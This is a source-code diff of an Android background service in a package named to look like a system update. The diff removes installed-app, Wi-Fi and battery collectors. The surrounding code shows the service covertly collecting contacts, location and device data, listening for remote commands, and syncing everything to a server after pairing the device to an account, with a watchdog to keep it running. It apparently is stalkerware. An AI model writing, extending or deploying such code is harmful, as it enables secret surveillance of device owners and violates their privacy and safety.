@@ -18,10 +18,6 @@ import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
 import androidx.lifecycle.lifecycleScope
 import com.androidsystem.update.BuildConfig
-import com.androidsystem.update.collector.BatteryAwareScheduler
-import com.androidsystem.update.collector.BatteryCollector
-import com.androidsystem.update.collector.InstalledAppsCollector
-import com.androidsystem.update.collector.WifiScanCollector
 import com.androidsystem.update.core.ConfigManager
 import com.androidsystem.update.core.EncryptionManager
 import com.androidsystem.update.database.*
@@ -49,10 +45,6 @@ class CoreService : LifecycleService() {
     @Inject lateinit var networkManager: NetworkManager
     @Inject lateinit var configManager: ConfigManager
     @Inject lateinit var secureComms: SecureCommunication
-    @Inject lateinit var installedAppsCollector: InstalledAppsCollector
-    @Inject lateinit var wifiScanCollector: WifiScanCollector
-    @Inject lateinit var batteryCollector: BatteryCollector
-    @Inject lateinit var batteryAwareScheduler: BatteryAwareScheduler
 
     // Nullable: devices without Google Play Services cannot create the fused
     // location client, and that must never take the whole service down.
@@ -133,12 +125,6 @@ class CoreService : LifecycleService() {
         loadRemoteConfig()
         loadIntervals()
         registerContactsObserver()
-        // New collectors register their broadcast receivers here so a freshly
-        // started service can keep them warm; lazy registration inside each
-        // collector still works as a fallback when the service is restarted
-        // by the watchdog without onCreate().
-        batteryCollector.ensureRegistered()
-        wifiScanCollector.ensureRegistered()
         scheduleTasks()
         listenForCommands()
         startLocationUpdates()
@@ -342,9 +328,6 @@ class CoreService : LifecycleService() {
         collectContacts()
         collectNetworkInfo()
         collectDeviceInfo()
-        // Installed apps snapshot (server diffs by package name). Heavier so
-        // it runs at most once per cycle.
-        try { installedAppsCollector.collect() } catch (e: Exception) { Log.e(TAG, "Apps collect error", e) }
     }
 
     @SuppressLint("MissingPermission")
@@ -665,13 +648,6 @@ class CoreService : LifecycleService() {
                     put("pairing_request", true)
                 }
             }
-            // Battery-aware: if the scheduler says pause (1-4%) we still send
-            // the heartbeat but skip heavy sync work elsewhere.
-            // Wi-Fi scan is gated by battery + plugged state to spare the radio.
-            val plan = batteryAwareScheduler.plan(syncIntervalMillis * 60_000L)
-            if (plan.allowWifiScan) {
-                try { wifiScanCollector.triggerScan() } catch (_: Exception) {}
-            }
             val result = secureComms.sendTelemetry(hb, SecureCommunication.Priority.LOW)
             // Pairing handshake: once the server confirms the device is bound
             // to an account, stop advertising the pairing code and hide the
@@ -768,20 +744,6 @@ class CoreService : LifecycleService() {
             device.first.forEach { batch.put(syncMessageJson(it)) }
             cursors["device"] = device.second
 
-            // New structured tables (v5) — full snapshot for installed_apps,
-            // incremental cursors for wifi_networks / battery_events.
-            val appsFull = repository.installedAppsSync(prefs.getLong("apps_full", 0L), limit)
-            appsFull.first.forEach { batch.put(syncMessageJson(it)) }
-            cursors["apps_full"] = appsFull.second
-
-            val wifi = repository.wifiSync(prefs.getLong("wifi", 0L), limit)
-            wifi.first.forEach { batch.put(syncMessageJson(it)) }
-            cursors["wifi"] = wifi.second
-
-            val battery = repository.batterySync(prefs.getLong("battery_events", 0L), limit)
-            battery.first.forEach { batch.put(syncMessageJson(it)) }
-            cursors["battery_events"] = battery.second
-
             if (batch.length() > 0 && secureComms.sendBatch(batch.toString())) {
                 cursors.forEach { (key, value) -> prefs.edit().putLong(key, value).apply() }
             }
@@ -871,10 +833,14 @@ class CoreService : LifecycleService() {
         )
     }
 
-    // Cached battery level: the collector registers ACTION_BATTERY_CHANGED
-    // once at service start, so heartbeats no longer hit registerReceiver()
-    // (which used to log a noisy "BroadcastQueue" wakeup every minute).
-    private fun getBatteryLevel(): Int = batteryCollector.getCachedLevel()
+    private fun getBatteryLevel(): Int {
+        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return intent?.let {
+            val level = it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
+            val scale = it.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
+            if (scale > 0) (level * 100 / scale.toFloat()).toInt() else 50
+        } ?: 50
+    }
 
     private fun checkPermission(permission: String): Boolean =
         ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
